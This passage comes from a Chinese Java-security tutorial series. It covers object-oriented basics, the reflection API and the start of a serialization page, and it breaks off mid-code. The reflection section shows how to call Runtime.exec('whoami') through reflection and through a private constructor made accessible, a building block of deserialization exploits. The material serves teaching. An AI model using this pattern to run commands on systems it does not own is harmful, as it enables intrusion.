最小的程序单元就是函数，每个函数负责完成某一个功能，用于接收输入数据，函数堆输入数据进行处理，然后输出结果数据 整个软件系统由一个个的函数组成，其中作为程序入口的函数称之为主函数，主函数依次调用其他函数，普通函数之间可以相互调用，从而实现整个系统功能 面向过程的设计缺陷 面向过程的设计，是采用了置顶而下的设计方式，再设计阶段就需要考虑每一个模块应该分解成哪些子模块，每个子模块有细分更小的子模块，如此类推，知道将模块细化成一个个函数 存在的问题： 设计不够直观，与人类思维习惯不一致（谁来吃饭，而不是吃饭谁来参与） 系统软件适应性差，可拓展性差，维护性低 面向过程最大的问题在于随着系统的膨胀，面向过程将无法应付，最终导致系统的崩溃。为了解决这一种软件危机，提出了面向对象的思想 面向对象 一种基于面向过程的新的编程思想，顾名思义该思想是站在对象的角度思考问题，我们把多个功能合理放到不同对象里，强调的是具备某些功能的对象，而具备某种功能的实体，称之为对象。 面向对象的最小程序单元是：类 面向对象的优势与特点 更加符合我们常规的思维方式，稳定性好，可重用性强，易于开发大型软件产品，有良好的可维护性，在软件工程中，面向对象可以使工程更加模块化，实现更低的耦合和更高的内聚，面向对象的三大特征如下： 封装 继承 多态 封装：指将对象的实现细节隐藏起来，然后通过公共的方法向外暴露该对象的功能 继承：面向对象实现软件复用的重要手段，当子类继承父类后，子类是一种特殊的父类，能直接或间接获得父类里的成员 多态：可以直接把子类对象赋值给父类变量，但是运行时依然表现出子类的行为特征，这意味着同一类型的对象在运行时可能表现出不同的行为特征 类和对象 面向对象的三大特征 封装 继承 多态 理解什么是抽象 从特定的角度出发，从已经存在的一些事物中抽取我们所关注的特性、行为、从而形成一个新的十五的思维过程，是一种复杂到简单的思维方式 对象和类的关系 对象可以定义为包含状态和行为的一个实体，对象（object）也称为实例（Instance） 实体：存在于现实世界中并且可以与其他物体区分开的物体，表示实际存在的个体 对象 人们要进行研究的任何事物，一切事物都可以认为是对象 对象具有状态和行为 状态：比如姓名，年龄，性别等 行为：比如吃饭，睡觉，写代码等 通过多个同类型的对象分析，我们可以把对象抽象成类 类 具有相同特性（状态）和行为（功能）的对象抽象就是类。因此，对象的抽象是类，类的具体化就是对象，也可以说类的实例就是对象，类实际上就是一种数据类型 特性：对象的状态，用成员变量来描述 功能：对象的行为，用方法来描述 类是对象的类型/模板；创建一个对象就是使用一个类作为构建该对象的基础，实际上解释类和对象的关系确实存在着“先有蛋还是先有鸡”的问题，描述类扫不了对象，相反，描述对象也少不了类。对象是类的实例，类是对象的模板 如何定义一个类 [修饰符] class 类名{ 0 ~ N 个成员变量(字段/Field) 不要叫属性(JavaBean 中特殊的一种成员); 0 ~ N 个方法 } 定义类的注意事项： 如果类使用了public修饰符，必须保证当前文件名和当前类名相同 类名使用名称表示，类表示某一类事物，首字母大写，如果是多个的单词组成使用驼峰表示法，如EmployeeAdvanceSetting 在面向对象的过程中，定义类的时候，专门为描述对象提供一个类，该类不需要main方法对象的创建和条用方法以及操作字段 ``` 根据类来创建对象的语法 a. 类名 变量 = new 类名(); 给字段设置值 a. 对象变量.字段名称 = 该类型的值; 获取对象的值 a. 该字段类型对象变量 变量 = 对象变量.字段值 通过对象调用方法 a. 对象变量.方法(实参) java // Person 类 package com.study.Object; public class Person { public String userName; public int age; public int weight; public void sign() { System.out.println(this.userName + \" is sign~\"); } public void dance() { System.out.println(this.userName + \" is dance~\"); } } ```java // main 函数 package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); aaron.userName = \"aaron\"; aaron.age = 24; joe.userName = \"joe\"; joe.age = 23; System.out.println(aaron.userName); System.out.println(joe.age); } } aaron 23 对象实例化的过程 方法区是存放加载的类信息，方法信息的地址，程序要运行，首先要将Main.class（包含方法等）放置在方法区，然后再将Person.class字节码存入到方法区内 栈里存放了方法运行（main方法）时的局部变量，aaron，joe都是对象变量 堆：当使用new 关键字，就表示在堆中开辟一块新的存储空间 对象的引用地址就是在new的时候在堆里创建的一个地址，这种关系被称为引用关系，当我们操作aaron对象的时候，实际上是操作的0x1234这个地址的数据 对象的打印、比较、生命周期 打印 打印对象的时候，打印出来的效果如下：类的名称@十六进制的hashcode 如果想知道对象里的成员变量信息，就需要Object.toString()方法 // Main package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); System.out.println(aaron); System.out.println(joe); } } com.study.Object.Person@1540e19d com.study.Object.Person@677327b6 比较 == : 对于基本数据类型来说，比较的是值，对于引用类型来说，比较的是在内存中地址的值，每次使用new关键字，都表示在堆值新开辟一块内存空间，不同的内存空间地址值不同 如果对象拥有完全相同的数据，是否能俩对象相等？可以使用Object.equals()方法 package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); System.out.println(aaron == joe); } } false 生命周期 对象什么时候出生：每次使用new 关键字的时候，就会在堆内存中开辟新的空间，此时对象开始存在 对象什么时候结束：当堆中的对象没有被任何变量所引用，此时该对象就成了垃圾，就等着垃圾回收器（GC）来回收该垃圾，当被回收后，对象就被销毁了 回收垃圾的目的是为了释放更多的内存 匿名对象：匿名/佚名 没有名称的对象，也就是在堆中开辟一块新的内存空间，但是没有把该空间地址赋给任何变量，如下所示 new Person(); 因为没有名称，匿名对象仅仅只能使用一次，用完一次之后，就等着GC来回收，一般的把匿名对象作为方法的实参传递 构造器 // 这个代码调用一个方法名为Person() 的无参数方法 // 这个方法就是构造方法(Constructor) Person person = new Person(); 我们在Person类中，没有找到该构造方法，却又没有报错，但是在反编译之后，是存在该构造方法 package com.study.Object; public class Person { public String userName; public int age; public int weight; public void sign() { System.out.println(this.userName + \" is sign~\"); } public void dance() { System.out.println(this.userName + \" is dance~\"); } } 当我们在编译的时候，编译器会创建该默认(缺省)构造函数 构造器的作用 创建对象，但是必须要和new一起使用 完成对象的初始化操作 构造器的特点 构造器的名称和当前所在类的名称相同 禁止定义返回类型，千万不要使用void作为返回类型，void Person(){}这就是个普通方法 在构造器中不需要使用return，返回的是当前创建对象的引用 编译器创建的默认构造器特点 符合构造函数特点 无参数 无方法体 如果类没有使用public修饰，则编译器创建的构造器也没有public修饰自定义构造器与构造器重载 如果没有显示提供构造器，则编译器在编译过程中会创建一个缺省构造器，但是如果显式定义了一个构造器，编译器在编译过程中则不会再创建缺省构造器自定义构造器 ```java // Person.java package com.study.Object; public class Person { public String userName; public int age; public int weight; public Person(){ System.out.println(\"我被调用了\"); } } ```java // Main.java package com.study.Object; public class Main { public static void main(String[] args) { Person person = new Person(); } } 我被调用了 说明创建对象其实是在调用构造器 构造器重载 方法的重载（Overload）避免在同一个类中，相同功能的方法名字不同 判断：两同一不同：同一个类，同一个方法名称，参数不同 构造器的的重载 构造器是一种特殊的方法，也可以存在重载 // Person.java package com.study.Object; public class Person { public String userName; public int age; public int weight; public Person(){ System.out.println(\"我被调用了\"); } public Person(String userName){ System.out.println(\"我被调用了username\"); } } // Main.java package com.study.Object; public class Main { public static void main(String[] args) { Person person = new Person(); Person Person1 = new Person(\"aaron\"); } } 我被调用了 我被调用了username static 修饰符 状态和行为应该有对象和类型之分 有的状态和行为应该属于对象，不同的对象状态和行为可以不一样 有的状态和行为应该属于类型，不属于对象 static 的真正作用，用来区别字段，方法，内部类，初始化代码块 static 修饰符的特点： static 修饰符修饰的成员(字段/方法)，随着所在类的加载而加载，当JVM把字节码加载进JVM的时候，static修饰的成员已经在内存中存在了 优先于对象的存在，对象是手动通过new关键字创建出来的 static 修饰符修饰的成员被该类型的所有对象共享，根据该类创建出来的任何对象，都可以访问static成员，表面上通过对象去访问static 修饰的成员，其本质依然使用类型访问，和对象没有任何关系 直接使用类名访问static成员，因为static修饰的成员直接属于类，不属于对象，可以直接使用类名访问static成员 ```java // Person.java package com.study.Object; public class Person { String name = \"\"; int age = 0; static int totalNum = 5; public Person(String name, int age) { name = name; age = age; totalNum++; } void die() { totalNum--; System.out.println(\"die\"); } static void destory() { totalNum = 0; System.out.println(\"destory\"); } } ```java package com.study.Object; public class Main { public static void main(String[] args) { System.out.println(Person.totalNum); Person person = new Person(\"aaron\",24); System.out.println(Person.totalNum); } } 5 6 static 成员在JVM中的存储 字节码加载进虚拟机，static成员就已经在方法区了 类成员与实例成员 类中的成员：字段、方法，内部类 类成员：使用static修饰的成员 实例成员：没有static 修饰的成员 类成员只能访问类成员，实例成员只能访问实例成员 类成员直接属于类，可以通过类访问static字段和static 方法 实例成员，只属于对象，通过对象来访问非static字段和非static 方法 在static 方法，只能调用static 成员 非static 方法，可以访问静态成员，也可以访问实例成员 什么时候定义成static 的字段和方法 如果这一个状态/行为属于整个事物（类）就直接使用static修饰i，被所有对象使用，一般在开发中，往往把工具方法使用static 修饰，如果不适用static修饰，则这些方法属于该类的对象，就得需要创建对象再调用方法，开发工具对象只需要一份即可，可能创建N个对象，此时往往把类设计为单例 弊端：生命周期长 未完待续。。。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:50:56 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/02.Java_面向对象.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/03.Java反射机制.html":{"url":"知识库/02.JAVA安全/03.Java反射机制.html","title":"03.Java反射机制","keywords":"","body":" 反射 何为反射 获取class的Class实例 方法一 方法二 方法三 方法四 比较 获取基本信息 小结 访问字段 获取字段的一些信息 获取字段的值 获取所有的字段 修改字段的值 小结 调用方法（‼️） 获取方法 调用方法 示例 小结 调用构造方法 举例 示例 小结 获取继承关系 获取父类class和interface 小结 动态代理 过程 小结 反射 何为反射 反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 class（包括interface）的本质是数据类型（Type） 而**class**是由JVM在执行过程中动态加载的。JVM在第一次读取到一种**class**类型时，将其加载进内存。 每加载一种class，JVM就为其创建一个Class类型的实例，并关联起来。注意：这里的Class类型是一个名叫Class的class。它长这样： public final class Class { private Class() {} } 以String类为例，当JVM加载String类时，它首先读取String.class文件到内存，然后，为String类创建一个Class实例并关联起来： Class cls = new Class(String); 这个Class实例是JVM内部创建的，如果我们查看JDK源码，可以发现Class类的构造方法是private，只有JVM能创建Class实例，我们自己的Java程序是无法创建Class实例的。 所以，JVM持有的每个Class实例都指向一个数据类型（class或interface） 由于JVM为每个加载的**class**创建了对应的**Class**实例，并在实例中保存了该**class**的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个**Class**实例，我们就可以通过这个**Class**实例获取到该实例对应的**class**的所有信息。 这种通过**Class**实例获取**class**信息的方法称为反射（Reflection）。 获取class的Class实例 获取一个class的Class实例，有4个方法： 方法一 直接通过一个class的静态变量class获取： Class cls = String.class; 方法二 如果我们有一个实例变量，可以通过该实例变量提供的getClass()方法获取： String s = \"Hello\"; Class cls = s.getClass(); 方法三 如果知道一个class的完整类名，可以通过静态方法Class.forName()获取： Class cls = Class.forName(\"java.lang.String\"); 方法四 利用classLoader Class cls = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\") 比较 因为Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例。可以用==比较两个Class实例： Class cls1 = String.class; String s = \"Hello\"; Class cls2 = s.getClass(); boolean sameClass = cls1 == cls2; // true 获取基本信息 获取class的基本信息 package org.example; import java.util.ArrayList; public class App{ public static void main(String[] args) { Class cls1 = String.class; ArrayList a = new ArrayList(); Class cls2 = a.getClass(); printInfo(cls1); printInfo(cls2); } static void printInfo(Class cls){ System.out.println(\"Class name : \" + cls.getName()); System.out.println(\"Simple name: \" + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\"Package name: \" + cls.getPackage().getName()); } System.out.println(\"is interface: \" + cls.isInterface()); System.out.println(\"is enum: \" + cls.isEnum()); System.out.println(\"is array: \" + cls.isArray()); System.out.println(\"is primitive: \" + cls.isPrimitive()); } } 小结 JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息； 获取一个class对应的Class实例后，就可以获取该class的所有信息； 通过Class实例获取class信息的方法称为反射（Reflection）； JVM总是动态加载class，可以在运行期根据条件来控制加载class。 访问字段 对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。 我们先看看如何通过Class实例获取字段信息。 获取字段的一些信息 import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { Class ot = OtherTest.class; System.out.println(Arrays.toString(ot.getFields())); // 获取所有public的field（包括父类） System.out.println(Arrays.toString(ot.getDeclaredFields())); // 获取当前类的所有field（不包括父类） System.out.println(ot.getField(\"a\")); // 根据字段名获取某个 public 的field（包括父类） System.out.println(ot.getDeclaredField(\"b\")); // 根据字段名获取当前类的某个field（不包括父类） System.out.println(ot.getField(\"a\").getName()); // 字段名称 System.out.println(ot.getField(\"a\").getType()); // 字段类型，也是一个Class实例 System.out.println(ot.getField(\"a\").getModifiers()); // 修饰符 } } class OtherTest extends emmTest{ public int a = 5; private int b; } class emmTest { public float cc; } [public int OtherTest.a, public float emmTest.cc] [public int OtherTest.a, private int OtherTest.b] public int OtherTest.a private int OtherTest.b a int 1 获取字段的值 先获取Class实例，再获取Field实例，然后，用Field.get(Object)获取指定实例的指定字段的值。 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 Object value = f.get(ot); // 从对象ot中获取值，因为所有的同类型class共用一个Class，所以获取内容要选定对象 System.out.println(value); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 haha 反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。 此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。 获取所有的字段 public class APP { public static void main(String[] args) throws IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field[] f = cls.getDeclaredFields(); //取所有的字段 for (Field field : f) { field.setAccessible(true);// 设置访问权限，一律为true，不然不能访问 private 的 System.out.println(field.getName() + \" \" + field.getType()); // 获取field 的Name，Type System.out.println(field.get(ot)); } } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 // name class java.lang.String // haha 修改字段的值 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 f.set(ot, \"modify\"); // 反射修改值 System.out.println(ot.getName()); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } public String getName() { return name; } } 小结 Java的反射API提供的Field类封装了字段的所有信息： 通过Class实例的方法可以获取Field实例：getField()，getFields()，getDeclaredField()，getDeclaredFields()； 通过Field实例可以获取字段信息：getName()，getType()，getModifiers()； 通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。 通过反射读写字段是一种非常规方法，它会破坏对象的封装。 调用方法（‼️） 获取方法 通过Class实例获取所有Method信息。Class类提供了以下几个方法来获取Method import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchMethodException { Class cls = OtherTest.class; // Class cls = ot.getClass(); System.out.println(Arrays.toString(cls.getMethods())); // 获取所有public的Method（包括父类） System.out.println(Arrays.toString(cls.getDeclaredMethods())); // 获取当前类的所有Method（不包括父类） System.out.println(cls.getMethod(\"echoEver\", String.class)); // 获取某个public的Method（包括父类） //.getMethod(方法名，这个方法的参数类型) System.out.println(cls.getDeclaredMethod(\"echoEver\", String.class)); // 获取当前类的某个Method（不包括父类） } } class OtherTest{ public void echoEver(String thing){ System.out.println(thing); } } // ===== /* [public void org.example.OtherTest.echoEver(java.lang.String), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] [public void org.example.OtherTest.echoEver(java.lang.String)] public void org.example.OtherTest.echoEver(java.lang.String) public void org.example.OtherTest.echoEver(java.lang.String) */ 调用方法 获取Class实例 反射获取方法 invoke调用方法 package org.example; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { OtherTest ot = new OtherTest(); Class cls = ot.getClass(); Method echoEver = cls.getDeclaredMethod(\"echoEver\", String.class); echoEver.setAccessible(true); echoEver.invoke(ot,\"test\"); // 第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数 } } class OtherTest{ private void echoEver(String thing){ System.out.println(thing); } } 示例 这里再以Java中使用反射调取Runtime来执行命令注入 // 传统使用Java 来执行Runtime进行命令执行代码 package org.example; import java.io.*; public class App { public static void main(String[] args) throws IOException{ Process s = Runtime.getRuntime().exec(\"whoami\"); InputStream inputStream = s.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } 使用反射 package com.ReflectTest; import java.io.*; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getDeclaredMethod(\"exec\", String.class); Process process = (Process) method.invoke(Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")), \"whoami\"); // 这里细看Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) // 在这里，method.invoke 第一个参数是实例化的对象，从不使用反射的代码中看，应该是Runtime.getRuntime() 这个实例化对象 // 然后要调用 getRuntime()的实例化对象则是Runtime，所以整合起来如下： // Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) // 这个就是上述调用exec方法的实例化对象RunTime.getRuntime() // 反射调用方法，就是从后往前依次寻找调用方法的实例化对象，加上参数 InputStream inputStream = process.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } class OtherTest { private void echoEver(String thing) { System.out.println(thing); } } 小结 Java的反射API提供的Method对象封装了方法的所有信息： 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()； 通过Method实例可以获取方法信息：getName()，getReturnType()，getParameterTypes()，getModifiers()； 通过Method实例可以调用某个对象的方法：Object invoke(Object instance, Object... parameters)； 通过设置setAccessible(true)来访问非public方法； 通过反射调用方法时，仍然遵循多态原则。 调用构造方法 举例 我们通常使用new操作符创建新的实例： Person p = new Person(); 如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法： Person p = Person.class.newInstance(); 调用**Class.newInstance()**的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过**Class.newInstance()**来调用。 为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例： package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class App { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class cls = Integer.class; System.out.println(cls.getName()); System.out.println(Arrays.toString(cls.getConstructors())); // Integer.class.getConstructor(int.class); Constructor cons1 = cls.getConstructor(int.class); Integer int1 = cons1.newInstance(123); System.out.println(int1); Constructor cons2 = cls.getConstructor(String.class); System.out.println(cons2.newInstance(\"456\")); } } /* java.lang.Integer [public java.lang.Integer(int), public java.lang.Integer(java.lang.String) throws java.lang.NumberFormatException] 123 456 */ 通过Class实例获取Constructor的方法如下： getConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。 调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。 示例 调用方法示例使用invoke方法反射调用Runtime.getRuntime.exec(String.class)方法，那么由Construct改写如下： package com.ReflectTest; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getDeclaredMethod(\"exec\", String.class); Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); // 实例化 Runtime runtime = (Runtime) constructor.newInstance(); // 使用exec调用 Process process = (Process) method.invoke(runtime.getRuntime(), \"whoami\"); InputStream inputStream = process.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } 小结 Constructor对象封装了构造方法的所有信息； 通过Class实例的方法可以获取Constructor实例：getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()； 通过Constructor实例可以创建一个实例对象：newInstance(Object... parameters)； 通过设置setAccessible(true)来访问非public构造方法。 获取继承关系 获取父类class和interface import java.util.Arrays; public class Test{ public static void main(String[] args) { OtherTest ot = new OtherTest(\"emm\"); Class cls = ot.getClass(); System.out.println(cls.getSuperclass()); // 获取父类class System.out.println(Arrays.toString(cls.getInterfaces())); // 获取接口 System.out.println(\"\".getClass().getSuperclass()); // 获取 String 的父类 } } class OtherTest extends Emmm implements Aaa{ private String name; public OtherTest(String name){ this.name = name; } @Override public void echo() { System.out.println(\"666\"); } } class Emmm { private int aa; } interface Aaa{ public void echo(); } /* class org.example.Emmm [interface org.example.Aaa] class java.lang.Object */ 小结 通过Class对象可以获取继承关系： Class getSuperclass()：获取父类类型； Class[] getInterfaces()：获取当前类实现的所有接口。 通过Class对象的isAssignableFrom()方法可以判断一个向上转型是否可以实现。 动态代理 有没有可能不编写实现类，直接在运行期创建某个**interface**的实例呢？ 这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。 所谓动态代理，是和静态相对应的。我们来看静态代码怎么写： // 创建接口 public interface Hello { void morning(String name); } // 实现接口Hello public class HelloWorld implements Hello { public void morning(String name) { System.out.println(\"Good morning, \" + name); } } // 创建实例，调用 public static void main(String[] args) { Hello hello = new HelloWorld(); hello.morning(\"Bob\"); } 动态如下 过程 ，不需要单独实现接口，而是动态实现接口。 过程 在运行期动态创建一个interface实例的方法如下： 定义一个InvocationHandler实例，它负责实现接口的方法调用； 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader； 需要实现的接口数组，至少需要传入一个接口进去； 用来处理接口方法调用的InvocationHandler实例。 将返回的Object强制转型为接口。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class App{ public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(args.length); // 实现对应的方法 if (method.getName().equals(\"echo\")){ System.out.println(args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(Hello.class.getClassLoader(), new Class[]{Hello.class}, handler); hello.echo(\"9999\"); } } interface Hello{ public void echo(String s); } /* 1 9999 */ 小结 Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例； 动态代理是通过Proxy创建代理对象，然后将接口方法“代理”给InvocationHandler完成的。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:49:59 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/03.Java反射机制.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/04.Java序列化与反序列化.html":{"url":"知识库/02.JAVA安全/04.Java序列化与反序列化.html","title":"04.Java序列化与反序列化","keywords":"","body":" Java 序列化和反序列化 介绍 什么是序列化和反序列化 序列化要求 其他 序列化步骤 反序列化步骤 代码举例 序列化和反序列化 --> 文件 序列化和反序列化 --> bytes数组 序列化特征 安全性 反序列化漏洞的攻击流程 漏洞挖掘 Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 **implements Serializable** 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new 